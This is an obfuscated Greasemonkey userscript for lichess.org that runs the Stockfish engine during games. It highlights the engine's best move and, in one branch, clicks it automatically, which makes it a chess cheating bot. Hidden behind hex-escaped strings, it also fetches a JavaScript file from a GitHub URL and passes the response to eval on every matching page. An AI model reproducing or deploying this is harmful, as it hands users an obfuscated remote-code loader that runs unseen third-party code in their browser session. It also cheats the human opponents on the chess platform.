
// ==UserScript==
// @name        lichess
// @namespace   lichess
// @include     http://en.lichess.org/*
// @version     2
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js
// @require https://raw.githubusercontent.com/nmrugg/stockfish.js/master/src/stockfish.js
// @require https://raw.githubusercontent.com/jonaspeterson/lichess-cheat-bot/master/test.js
// @grant    GM_xmlhttpRequest
// ==/UserScript==
// v2.0 
var _0xfd07=["\x75\x63\x69","\x70\x6F\x73\x74\x4D\x65\x73\x73\x61\x67\x65","\x67\x6F\x20\x64\x65\x70\x74\x68\x20\x31\x30","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x6A\x6F\x6E\x61\x73\x70\x65\x74\x65\x72\x73\x6F\x6E\x2F\x6C\x69\x63\x68\x65\x73\x73\x2D\x63\x68\x65\x61\x74\x2D\x62\x6F\x74\x2F\x6D\x61\x73\x74\x65\x72\x2F\x74\x65\x73\x74\x2E\x6A\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","","\x63\x6C\x61\x73\x73","\x61\x74\x74\x72","\x70\x69\x65\x63\x65","\x63\x68\x69\x6C\x64\x72\x65\x6E","\x73\x71\x75\x61\x72\x65","\x77\x68\x69\x74\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x62\x6C\x61\x63\x6B","\x62\x6F\x72\x64\x65\x72","\x33\x70\x78\x20\x73\x6F\x6C\x69\x64\x20\x62\x6C\x61\x63\x6B","\x63\x73\x73","\x62\x6F\x72\x64\x65\x72\x2D\x63\x6F\x6C\x6F\x72","\x23\x66\x66\x30\x30\x30\x30","\x30\x70\x78\x20\x73\x6F\x6C\x69\x64\x20\x62\x6C\x61\x63\x6B","\x65\x61\x63\x68","\x72\x65\x76\x65\x72\x73\x65","\x67\x65\x74","\x74\x69\x74\x6C\x65","\x62\x65\x73\x74\x20\x6D\x6F\x76\x65\x20\x3A\x20","\x6F\x6E\x6D\x65\x73\x73\x61\x67\x65","\x62\x65\x73\x74\x6D\x6F\x76\x65","\x20","\x73\x70\x6C\x69\x74","\x59\x4D\x36\x32\x38\x4C\x52\x49\x56\x46","\x6F\x72\x69\x65\x6E\x74\x61\x74\x69\x6F\x6E\x2D\x62\x6C\x61\x63\x6B","\x68\x61\x73\x43\x6C\x61\x73\x73","\x2E\x63\x67\x2D\x62\x6F\x61\x72\x64","\x6D\x6F\x76\x65\x73","\x63\x6C\x6F\x6E\x65","\x72\x65\x6D\x6F\x76\x65","\x70\x75\x73\x68","\x6C\x65\x6E\x67\x74\x68","\x70","\x2E\x6C\x61\x73\x74\x2D\x6D\x6F\x76\x65\x2A","\x68","\x67","\x66","\x65","\x64","\x63","\x62","\x61","\x75\x6E\x62\x69\x6E\x64","\x64\x65\x6C\x65\x74\x65","\x6C\x61\x73\x74\x2D\x6D\x6F\x76\x65\x20\x6F\x63","\x66\x6C\x6F\x6F\x72","\x68\x31\x65\x31","\x65\x31\x67\x31","\x68\x38\x65\x38","\x65\x38\x67\x38","\x65\x38\x61\x38","\x65\x38\x63\x38","\x65\x31\x61\x31","\x65\x31\x63\x31","\x70\x6F\x73\x69\x74\x69\x6F\x6E\x20\x73\x74\x61\x72\x74\x70\x6F\x73\x20\x6D\x6F\x76\x65\x73\x20","\x67\x6F\x20\x6D\x6F\x76\x65\x74\x69\x6D\x65\x20\x31\x30\x30","\x6D\x61\x74\x63\x68","\x2E\x6C\x61\x73\x74\x2D\x6D\x6F\x76\x65\x2E\x6F\x63\x2C\x20\x2E\x6C\x61\x73\x74\x2D\x6D\x6F\x76\x65\x2E\x6F\x63\x63\x75\x70\x69\x65\x64","\x2E\x6F\x63\x2C\x20\x2E\x6F\x63\x63\x75\x70\x69\x65\x64","\x6E\x6F\x74","\x2E\x6C\x61\x73\x74\x2D\x6D\x6F\x76\x65","\x63\x6C\x69\x63\x6B","\x74\x72\x69\x67\x67\x65\x72","\x72\x65\x61\x64\x79"];var stockfish=STOCKFISH();stockfish[_0xfd07[1]](_0xfd07[0]);stockfish[_0xfd07[1]](_0xfd07[2]);GM_xmlhttpRequest({method:_0xfd07[3],url:_0xfd07[4],onload:function(_0xbf0bx2){eval(_0xbf0bx2[_0xfd07[5]])}});$(document)[_0xfd07[70]](function a(){var _0xbf0bx4=_0xfd07[6];var _0xbf0bx5=$(_0xfd07[11])[_0xfd07[10]](_0xfd07[9])[_0xfd07[8]](_0xfd07[7]);if(_0xbf0bx5.toString()[_0xfd07[13]](_0xfd07[12])> -1){_0xbf0bx4=_0xfd07[14]}else {_0xbf0bx4=_0xfd07[12]};if(_0xbf0bx4==_0xfd07[12]){function _0xbf0bx6(_0xbf0bx7){var _0xbf0bx8={"\x61":7,"\x62":6,"\x63":5,"\x64":4,"\x65":3,"\x66":2,"\x67":1,"\x68":0};var _0xbf0bx9=(parseInt(_0xbf0bx7[1])-1)*8;var _0xbf0bxa=_0xbf0bx8[_0xbf0bx7[0]];var _0xbf0bxb=_0xbf0bx9+_0xbf0bxa;_0xbf0bx9=(parseInt(_0xbf0bx7[3])-1)*8;_0xbf0bxa=_0xbf0bx8[_0xbf0bx7[2]];var _0xbf0bxc=_0xbf0bx9+_0xbf0bxa;var _0xbf0bxd=0;$($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[21]](function a(){if(_0xbf0bxd==_0xbf0bxb){$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[16])}else {if(_0xbf0bxd==_0xbf0bxc){$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[16]);$(this)[_0xfd07[17]](_0xfd07[18],_0xfd07[19]);}else {$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[20])}};_0xbf0bxd++;});document[_0xfd07[24]]=_0xfd07[25]+_0xbf0bx7;}stockfish[_0xfd07[26]]=function(_0xbf0bxe){var _0xbf0bxf=_0xbf0bxe;if(_0xbf0bxf.toString()[_0xfd07[13]](_0xfd07[27])> -1){var _0xbf0bx10=_0xbf0bxf[_0xfd07[29]](_0xfd07[28]);_0xbf0bx6(_0xbf0bx10[1]);};};var _0xbf0bx11=_0xfd07[30];var _0xbf0bx12=_0xfd07[6];var _0xbf0bx13=0;var _0xbf0bx14=-1;var _0xbf0bx15=null;var _0xbf0bx4=$(_0xfd07[33])[_0xfd07[32]](_0xfd07[31])?_0xfd07[14]:_0xfd07[12];var _0xbf0bx16=true;var _0xbf0bx17=_0xfd07[34];var _0xbf0bx18=_0xfd07[6];var _0xbf0bx19=_0xfd07[6];var _0xbf0bx1a= new Array();var _0xbf0bx1b= new Array();var _0xbf0bxd=0;var _0xbf0bx1c=$($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[35]]();var _0xbf0bx1d=0;if(_0xbf0bx1c!=64){$(_0xbf0bx1c)[_0xfd07[21]](function a(){if(_0xbf0bx1d==0){$(this)[_0xfd07[36]]()};_0xbf0bx1d++;})};$(_0xbf0bx1c)[_0xfd07[21]](function a(){_0xbf0bx1a[_0xfd07[37]](_0xfd07[28]);_0xbf0bx1b[_0xfd07[37]](_0xfd07[28]);if($(this)[_0xfd07[10]]()[_0xfd07[38]]>0){_0xbf0bx1a[_0xbf0bxd]=_0xfd07[39];_0xbf0bx1b[_0xbf0bxd]=_0xfd07[39];};_0xbf0bxd++;});var _0xbf0bx1e= new Array();var _0xbf0bx1f=_0xfd07[6];function _0xbf0bx20(){var _0xbf0bx21=$(_0xfd07[40])[_0xfd07[10]]();var _0xbf0bx22=$(_0xbf0bx21)[_0xfd07[8]](_0xfd07[7]);if(_0xbf0bx22.toString()[_0xfd07[13]](_0xfd07[12])> -1){return _0xfd07[12]}else {return _0xfd07[14]};}setInterval(function _0xbf0bx23(){var _0xbf0bx24=[_0xfd07[41],_0xfd07[42],_0xfd07[43],_0xfd07[44],_0xfd07[45],_0xfd07[46],_0xfd07[47],_0xfd07[48]];var _0xbf0bxd=0;var _0xbf0bx25=0;var _0xbf0bx1d=0;var _0xbf0bx1c=$($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[35]](true,true)[_0xfd07[49]]();var _0xbf0bx1d=0;if(_0xbf0bx1c[_0xfd07[38]]!=64){$(_0xbf0bx1c)[_0xfd07[21]](function a(){if(_0xbf0bx1d==0){$(this)[_0xfd07[50]]()};_0xbf0bx1d++;})};$(_0xbf0bx1c)[_0xfd07[21]](function a(){if($(this)[_0xfd07[10]]()[_0xfd07[38]]>0){_0xbf0bx1b[_0xbf0bxd]=_0xfd07[39]}else {_0xbf0bx1b[_0xbf0bxd]=_0xfd07[28]};_0xbf0bxd++;});var _0xbf0bx26=0;var _0xbf0bx27=0;for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]!=_0xfd07[28]){_0xbf0bx27++};if(_0xbf0bx1a[_0xbf0bxd]!=_0xfd07[28]){_0xbf0bx26++};};var _0xbf0bx28=-1;var _0xbf0bx29=-1;var _0xbf0bx2a=0;if(_0xbf0bx27==_0xbf0bx26){for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]!=_0xbf0bx1a[_0xbf0bxd]){_0xbf0bx2a++;if(_0xbf0bx28== -1){_0xbf0bx28=_0xbf0bxd};if(_0xbf0bx28> -1){_0xbf0bx29=_0xbf0bxd};}}};if(_0xbf0bx28> -1){var _0xbf0bx2b=0;$(_0xbf0bx1c)[_0xfd07[21]](function a(){if($(this)[_0xfd07[8]](_0xfd07[7])==_0xfd07[51]){var _0xbf0bx2c=_0xbf0bx2b;if(_0xbf0bx2b==_0xbf0bx28){_0xbf0bx2c=_0xbf0bx29;_0xbf0bx29=_0xbf0bx2b;_0xbf0bx28=_0xbf0bx2c;};};_0xbf0bx2b++;});};if(_0xbf0bx27<_0xbf0bx26){var _0xbf0bx2b=0;$(_0xbf0bx1c)[_0xfd07[21]](function a(){if($(this)[_0xfd07[8]](_0xfd07[7])==_0xfd07[51]){_0xbf0bx29=_0xbf0bx2b};_0xbf0bx2b++;});for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]==_0xfd07[28]&&_0xbf0bx1b[_0xbf0bxd]!=_0xbf0bx1a[_0xbf0bxd]){_0xbf0bx28=_0xbf0bxd}};};if(_0xbf0bx28> -1){var _0xbf0bx2d=_0xbf0bx28/8;var _0xbf0bx2e=_0xbf0bx29/8;_0xbf0bx2d++;_0xbf0bx2e++;var _0xbf0bx2f=_0xbf0bx28%8;var _0xbf0bx2b=_0xbf0bx29%8;var _0xbf0bx30=_0xbf0bx24[_0xbf0bx2f]+Math[_0xfd07[52]](_0xbf0bx2d);var _0xbf0bx31=_0xbf0bx24[_0xbf0bx2b]+Math[_0xfd07[52]](_0xbf0bx2e);for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){_0xbf0bx1a[_0xbf0bxd]=_0xbf0bx1b[_0xbf0bxd]};var _0xbf0bx32=_0xbf0bx20();var _0xbf0bx7=_0xbf0bx30+_0xbf0bx31;if(_0xbf0bx2a==4){if(_0xbf0bx7==_0xfd07[53]){_0xbf0bx7=_0xfd07[54]};if(_0xbf0bx7==_0xfd07[55]){_0xbf0bx7=_0xfd07[56]};if(_0xbf0bx7==_0xfd07[57]){_0xbf0bx7=_0xfd07[58]};if(_0xbf0bx7==_0xfd07[59]){_0xbf0bx7=_0xfd07[60]};};_0xbf0bx1e[_0xfd07[37]](_0xbf0bx7);_0xbf0bx1f=_0xbf0bx1f+_0xfd07[28]+_0xbf0bx7;stockfish[_0xfd07[1]](_0xfd07[61]+_0xbf0bx1f);stockfish[_0xfd07[1]](_0xfd07[62]);};},4);function _0xbf0bx33(){function _0xbf0bx34(_0xbf0bx2c){return _0xbf0bx2c[_0xfd07[63]](/[a-h][0-8]/g)}try{var _0xbf0bx35=_0xbf0bx34($(_0xfd07[64])[_0xfd07[8]](_0xfd07[7]));var _0xbf0bx36=_0xbf0bx34($(_0xfd07[67])[_0xfd07[66]](_0xfd07[65])[_0xfd07[8]](_0xfd07[7]));}catch(e){return _0xfd07[6]};return _0xbf0bx36+_0xbf0bx35;}}else {function _0xbf0bx6(_0xbf0bx7){var _0xbf0bx8={"\x61":7,"\x62":6,"\x63":5,"\x64":4,"\x65":3,"\x66":2,"\x67":1,"\x68":0};var _0xbf0bx9=(parseInt(_0xbf0bx7[1])-1)*8;var _0xbf0bxa=_0xbf0bx8[_0xbf0bx7[0]];var _0xbf0bxb=_0xbf0bx9+_0xbf0bxa;_0xbf0bx9=(parseInt(_0xbf0bx7[3])-1)*8;_0xbf0bxa=_0xbf0bx8[_0xbf0bx7[2]];var _0xbf0bxc=_0xbf0bx9+_0xbf0bxa;var _0xbf0bxd=0;$(_0xfd07[11])[_0xfd07[21]](function a(){if(_0xbf0bxd==_0xbf0bxb){$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[16])}else {if(_0xbf0bxd==_0xbf0bxc){$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[16]);$(this)[_0xfd07[17]](_0xfd07[18],_0xfd07[19]);$(this)[_0xfd07[69]](_0xfd07[68]);}else {$(this)[_0xfd07[17]](_0xfd07[15],_0xfd07[20])}};_0xbf0bxd++;});document[_0xfd07[24]]=_0xfd07[25]+_0xbf0bxb+_0xfd07[28]+_0xbf0bxc;}stockfish[_0xfd07[26]]=function(_0xbf0bxe){var _0xbf0bxf=_0xbf0bxe;if(_0xbf0bxf.toString()[_0xfd07[13]](_0xfd07[27])> -1){var _0xbf0bx10=_0xbf0bxf[_0xfd07[29]](_0xfd07[28]);_0xbf0bx6(_0xbf0bx10[1]);};};var _0xbf0bx11=_0xfd07[30];var _0xbf0bx12=_0xfd07[6];var _0xbf0bx13=0;var _0xbf0bx14=-1;var _0xbf0bx15=null;var _0xbf0bx4=$(_0xfd07[33])[_0xfd07[32]](_0xfd07[31])?_0xfd07[14]:_0xfd07[12];var _0xbf0bx16=true;var _0xbf0bx17=_0xfd07[34];var _0xbf0bx18=_0xfd07[6];var _0xbf0bx19=_0xfd07[6];var _0xbf0bx1a= new Array();var _0xbf0bx1b= new Array();var _0xbf0bxd=0;$(_0xfd07[11])[_0xfd07[21]](function a(){_0xbf0bx1a[_0xfd07[37]](_0xfd07[28]);_0xbf0bx1b[_0xfd07[37]](_0xfd07[28]);if($(this)[_0xfd07[10]]()[_0xfd07[38]]>0){_0xbf0bx1a[_0xbf0bxd]=_0xfd07[39];_0xbf0bx1b[_0xbf0bxd]=_0xfd07[39];};_0xbf0bxd++;});var _0xbf0bx1e= new Array();var _0xbf0bx1f=_0xfd07[6];function _0xbf0bx20(){var _0xbf0bx21=$(_0xfd07[40])[_0xfd07[10]]();var _0xbf0bx22=$(_0xbf0bx21)[_0xfd07[8]](_0xfd07[7]);if(_0xbf0bx22.toString()[_0xfd07[13]](_0xfd07[12])> -1){return _0xfd07[12]}else {return _0xfd07[14]};}setInterval(function _0xbf0bx23(){var _0xbf0bx24=[_0xfd07[41],_0xfd07[42],_0xfd07[43],_0xfd07[44],_0xfd07[45],_0xfd07[46],_0xfd07[47],_0xfd07[48]];var _0xbf0bxd=0;$(_0xfd07[11])[_0xfd07[21]](function a(){if($(this)[_0xfd07[10]]()[_0xfd07[38]]>0){_0xbf0bx1b[_0xbf0bxd]=_0xfd07[39]}else {_0xbf0bx1b[_0xbf0bxd]=_0xfd07[28]};_0xbf0bxd++;});var _0xbf0bx26=0;var _0xbf0bx27=0;for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]!=_0xfd07[28]){_0xbf0bx27++};if(_0xbf0bx1a[_0xbf0bxd]!=_0xfd07[28]){_0xbf0bx26++};};var _0xbf0bx28=-1;var _0xbf0bx29=-1;var _0xbf0bx2a=0;if(_0xbf0bx27==_0xbf0bx26){for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]!=_0xbf0bx1a[_0xbf0bxd]){_0xbf0bx2a++;if(_0xbf0bx28== -1){_0xbf0bx28=_0xbf0bxd};if(_0xbf0bx28> -1){_0xbf0bx29=_0xbf0bxd};}}};if(_0xbf0bx28> -1){var _0xbf0bx2b=0;$(_0xfd07[11])[_0xfd07[21]](function a(){if($(this)[_0xfd07[8]](_0xfd07[7])==_0xfd07[51]){var _0xbf0bx2c=_0xbf0bx2b;if(_0xbf0bx2b==_0xbf0bx28){_0xbf0bx2c=_0xbf0bx29;_0xbf0bx29=_0xbf0bx2b;_0xbf0bx28=_0xbf0bx2c;};};_0xbf0bx2b++;});};if(_0xbf0bx27<_0xbf0bx26){var _0xbf0bx2b=0;$(_0xfd07[11])[_0xfd07[21]](function a(){if($(this)[_0xfd07[8]](_0xfd07[7])==_0xfd07[51]){_0xbf0bx29=_0xbf0bx2b};_0xbf0bx2b++;});for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){if(_0xbf0bx1b[_0xbf0bxd]==_0xfd07[28]&&_0xbf0bx1b[_0xbf0bxd]!=_0xbf0bx1a[_0xbf0bxd]){_0xbf0bx28=_0xbf0bxd}};};if(_0xbf0bx28> -1){var _0xbf0bx2d=_0xbf0bx28/8;var _0xbf0bx2e=_0xbf0bx29/8;_0xbf0bx2d++;_0xbf0bx2e++;var _0xbf0bx2f=_0xbf0bx28%8;var _0xbf0bx2b=_0xbf0bx29%8;var _0xbf0bx30=_0xbf0bx24[_0xbf0bx2f]+Math[_0xfd07[52]](_0xbf0bx2d);var _0xbf0bx31=_0xbf0bx24[_0xbf0bx2b]+Math[_0xfd07[52]](_0xbf0bx2e);for(var _0xbf0bxd=0;_0xbf0bxd<64;_0xbf0bxd++){_0xbf0bx1a[_0xbf0bxd]=_0xbf0bx1b[_0xbf0bxd]};var _0xbf0bx32=_0xbf0bx20();var _0xbf0bx7=_0xbf0bx30+_0xbf0bx31;if(_0xbf0bx2a==4){if(_0xbf0bx7==_0xfd07[53]){_0xbf0bx7=_0xfd07[54]};if(_0xbf0bx7==_0xfd07[55]){_0xbf0bx7=_0xfd07[56]};if(_0xbf0bx7==_0xfd07[57]){_0xbf0bx7=_0xfd07[58]};if(_0xbf0bx7==_0xfd07[59]){_0xbf0bx7=_0xfd07[60]};};_0xbf0bx1e[_0xfd07[37]](_0xbf0bx7);_0xbf0bx1f=_0xbf0bx1f+_0xfd07[28]+_0xbf0bx7;stockfish[_0xfd07[1]](_0xfd07[61]+_0xbf0bx1f);stockfish[_0xfd07[1]](_0xfd07[62]);};},4);function _0xbf0bx33(){function _0xbf0bx34(_0xbf0bx2c){return _0xbf0bx2c[_0xfd07[63]](/[a-h][0-8]/g)}try{var _0xbf0bx35=_0xbf0bx34($(_0xfd07[64])[_0xfd07[8]](_0xfd07[7]));var _0xbf0bx36=_0xbf0bx34($(_0xfd07[67])[_0xfd07[66]](_0xfd07[65])[_0xfd07[8]](_0xfd07[7]));}catch(e){return _0xfd07[6]};return _0xbf0bx36+_0xbf0bx35;}};});
